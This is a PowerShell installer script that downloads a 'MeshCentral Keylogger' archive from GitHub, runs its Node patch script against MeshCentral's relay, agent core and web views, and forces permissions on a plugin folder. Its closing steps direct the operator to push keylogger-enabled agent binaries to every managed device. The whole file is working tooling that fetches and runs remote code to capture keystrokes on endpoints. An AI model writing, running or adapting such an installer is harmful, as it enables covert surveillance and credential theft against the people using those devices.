param(
    [string]$MeshCentralRoot = 'C:\Program Files\Open Source\MeshCentral',
    [string]$ServiceName = 'meshcentral.exe'
)

$ErrorActionPreference = 'Stop'

$package = Join-Path $MeshCentralRoot 'node_modules\meshcentral'
$data = Join-Path $MeshCentralRoot 'meshcentral-data'
$plugin = Join-Path $data 'plugins\mckeylog'
$node = (Get-Command node.exe -ErrorAction SilentlyContinue).Source
if ([string]::IsNullOrWhiteSpace($node)) {
    $node = 'C:\Program Files\nodejs\node.exe'
}

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]::new($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Open PowerShell with Run as administrator, then run this installer again.'
}
if (-not (Test-Path -LiteralPath $package)) { throw "MeshCentral package not found: $package" }
if (-not (Test-Path -LiteralPath $node)) { throw "Node.js not found: $node" }

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$work = Join-Path ([IO.Path]::GetTempPath()) ('mckeylog-' + $stamp)
$archive = Join-Path $work 'meshcentral-keylogger.zip'
$sourceRoot = Join-Path $work 'meshcentral-keylogger-main'
$backup = Join-Path (Join-Path $data 'mckeylog-backups') $stamp
$serviceWasRunning = $false
New-Item -ItemType Directory -Force -Path $work, $backup | Out-Null

try {
    Write-Output 'Downloading the current MeshCentral Keylogger project from GitHub...'
    Invoke-WebRequest -Uri 'https://github.com/og-debug447/meshcentral-keylogger/archive/refs/heads/main.zip' -OutFile $archive
    Expand-Archive -LiteralPath $archive -DestinationPath $work -Force
    if (-not (Test-Path -LiteralPath (Join-Path $sourceRoot 'scripts\patch_meshcentral.js'))) {
        throw 'The downloaded keylogger project is missing its patch script.'
    }

    $targets = @(
        @{ Source = (Join-Path $package 'meshrelay.js'); Destination = 'meshrelay.js' },
        @{ Source = (Join-Path $package 'agents\meshcore.js'); Destination = 'meshcore.js' },
        @{ Source = (Join-Path $package 'views\default.handlebars'); Destination = 'default.handlebars' },
        @{ Source = (Join-Path $package 'views\default3.handlebars'); Destination = 'default3.handlebars' }
    )
    foreach ($target in $targets) {
        if (-not (Test-Path -LiteralPath $target.Source)) { throw "MeshCentral file not found: $($target.Source)" }
        Copy-Item -LiteralPath $target.Source -Destination (Join-Path $backup $target.Destination)
    }

    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($null -ne $service -and $service.Status -ne 'Stopped') {
        Write-Output "Stopping $ServiceName while MeshCentral files are updated..."
        Stop-Service -Name $ServiceName -Force
        (Get-Service -Name $ServiceName).WaitForStatus('Stopped', [TimeSpan]::FromSeconds(45))
        $serviceWasRunning = $true
    }

    New-Item -ItemType Directory -Force -Path $plugin | Out-Null
    # A previous installer can leave plugin files with a SYSTEM-only ACL.
    # This installer is already running elevated, so grant the current
    # administrator access before replacing the old plugin tree.
    & icacls.exe $plugin /grant "$($identity.Name):(OI)(CI)(F)" /T /C | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "Could not update plugin permissions: $plugin" }
    Copy-Item -Path (Join-Path $sourceRoot '*') -Destination $plugin -Recurse -Force
    & $node (Join-Path $sourceRoot 'scripts\patch_meshcentral.js') $package
    if ($LASTEXITCODE -ne 0) { throw "MeshCentral patch exited with code $LASTEXITCODE" }

    if ($null -ne $service) {
        Write-Output "Starting $ServiceName..."
        Start-Service -Name $ServiceName
        (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
    }
    Write-Output 'Keylogger plugin installed and MeshCentral patched.'
    Write-Output 'Next steps:'
    Write-Output '  1. Open the MeshCentral admin console, go to Plugins and install "MeshCentral Keylogger" (or use the plugin URL from the project README).'
    Write-Output '  2. Run install-keylogger-agent.ps1 to publish the keylogger-enabled agent binaries.'
    Write-Output '  3. On each device, reinstall/update the agent, then hard-refresh PC Control with Ctrl+F5. The Keylogs tab appears on device pages.'
    Write-Output "Backup: $backup"
} catch {
    Write-Output "Installation failed. The original MeshCentral files are backed up at $backup"
    if ($serviceWasRunning) {
        try {
            $currentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($null -ne $currentService -and $currentService.Status -eq 'Stopped') {
                Start-Service -Name $ServiceName
                (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
            }
        } catch { Write-Output "MeshCentral service recovery failed: $($_.Exception.Message)" }
    }
    throw
}
